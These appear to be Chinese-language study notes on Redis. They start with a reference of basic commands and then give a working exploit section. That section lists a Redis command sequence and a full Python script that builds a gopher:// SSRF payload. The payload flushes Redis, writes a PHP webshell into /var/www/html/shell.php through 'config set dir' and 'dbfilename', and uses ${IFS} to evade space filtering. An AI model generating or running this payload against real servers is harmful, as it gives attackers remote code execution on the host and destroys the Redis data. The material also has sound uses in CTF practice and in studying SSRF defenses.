# Redis

## 简介

存储键值对的高效数据库，常用来作为缓存服务

默认端口 ``6379``

基本命令

1. 查询键

``key <pattern>`` 根据pattern查询键

``keys *`` 查询所有的键，会遍历所有的键值，复杂度O(n)

``randomkey`` 随机返回一个键

``dbsize`` 查询键总数，直接获取redis内置的键总数变量，复杂度O(1)

``exists <key>`` 存在返回1，不存在返回0

``type key`` 如果键hello是字符串类型，则返回string；如果键不存在，则返回none


``ttl`` 命令可以查看键hello的剩余过期时间，单位：秒（>0剩余过期时间；-1没设置过期时间；-2键不存在）
``pttl`` 是毫秒

2. 键重命名

``rename key newkey``
``renamenx key newkey`` 只有newkey不存在时才会被覆盖

3. 设置键值

``set <key> <value> [ex]  [px]  [nx|xx]``

``ex``为键值设置秒级过期时间
``px``为键值设置毫秒级过期时间
``nx``键必须不存在，才可以设置成功，用于添加
``xx``与``nx``相反，键必须存在，才可以设置成功，用于更新
``setnx``、``setex`` 与上面的``nx``、``ex``作用相同

批量设置值O(k)
``mset <key> <value> [key value ......]``

``mset a 1 b 2 c 3 d 4``

设置并返回原值O(1)

``getset key value``

4. 获取值O(1)
   
``get key`` 不存在则返回``nil``

批量获取值O(k)，k是键的个数

``mget key [key ......]``

``strlen key`` 字符串长度O(1) 每个汉字占用3个字字节

5. 删除键O(k)

``del <key> [key...]`` 返回结果为成功删除键的个数

``flushdb`` 清空数据库

6. 其他指令

```
 9.1 auth password                       , 登录redis时输入密码
 9.2 echo message               , 打印一个特定的信息message，测试时使用
 9.3 ping                                , 测试与服务器的连接，如果正常则返回pong
 9.4 quit                                , 请求服务器关闭与当前客户端的连接
 9.5 select index                        , 切换到指定的数据库
 10.5 config get parameter               , 取得运行redis服务器的配置参数
10.6 config set parameter value         , 设置redis服务器的配置参数
10.7 config resetstat                   , 重置info命令的某些统计数据
```


## redis 写文件

payload:

```python
cmd=[
    "flushall",
    "set 1 {}".format(shell.replace(" ","${IFS}")),
    "config set dir {}".format(path),
    "config set dbfilename {}".format(filename),
    "save"
    ]
```

利用``gopher``协议SSRF攻击

```python
import urllib
protocol="gopher://"
ip=""
port="6379"
shell="\n\n<?php system(\"cat /flag\");?>\n\n"
filename="shell.php"
path="/var/www/html"
passwd=""
cmd=[
    "flushall",
    "set 1 {}".format(shell.replace(" ","${IFS}")),
    "config set dir {}".format(path),
    "config set dbfilename {}".format(filename),
    "save"
    ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ") 
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```

## 参考资料

【Redis】Redis常用命令 https://segmentfault.com/a/1190000010999677

## 扩展资料


浅析Redis中SSRF的利用 https://xz.aliyun.com/t/5665